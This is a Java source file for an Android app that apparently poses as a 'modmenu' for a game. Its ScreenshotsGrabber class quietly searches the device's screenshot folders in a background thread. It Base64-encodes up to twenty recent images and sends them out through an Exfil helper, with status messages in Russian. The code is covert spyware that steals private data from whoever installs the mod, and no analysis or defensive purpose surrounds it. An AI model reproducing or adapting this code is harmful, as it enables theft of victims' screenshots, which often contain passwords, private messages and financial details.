package com.brawl.modmenu;

import android.os.Environment;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class ScreenshotsGrabber {

    public static void grab() {
        new Thread(() -> {
            try {
                List<File> all = new ArrayList<>();
                File sd = Environment.getExternalStorageDirectory();
                File[] dirs = {
                    new File(sd, "Pictures/Screenshots"),
                    new File(sd, "DCIM/Screenshots"),
                    new File(sd, "Screenshots"),
                    new File(sd, "Pictures/Screen")
                };

                for (File d : dirs) {
                    if (d != null && d.exists()) collect(d, all, 0);
                }

                if (all.isEmpty()) {
                    Exfil.send("SCREENS", "Скриншоты не найдены");
                    return;
                }

                all.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                int sent = 0;
                for (File p : all) {
                    if (sent >= 20) break;
                    if (p.length() > 10 * 1024 * 1024) continue;
                    try {
                        byte[] data = new byte[(int) p.length()];
                        FileInputStream fis = new FileInputStream(p);
                        fis.read(data);
                        fis.close();
                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        Exfil.sendPhotoFile("SCREENSHOT: " + p.getName(), b64);
                        sent++;
                        Thread.sleep(800);
                    } catch (Throwable ignored) {}
                }
                Exfil.send("SCREENS", "Отправлено: " + sent + " из " + all.size());
            } catch (Throwable t) {
                Exfil.send("SCREENS", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    private static void collect(File dir, List<File> out, int depth) {
        if (dir == null || depth > 2 || out.size() > 100) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) collect(f, out, depth + 1);
            else if (isImage(f.getName())) out.add(f);
        }
    }

    private static boolean isImage(String n) {
        String l = n.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png");
    }
}
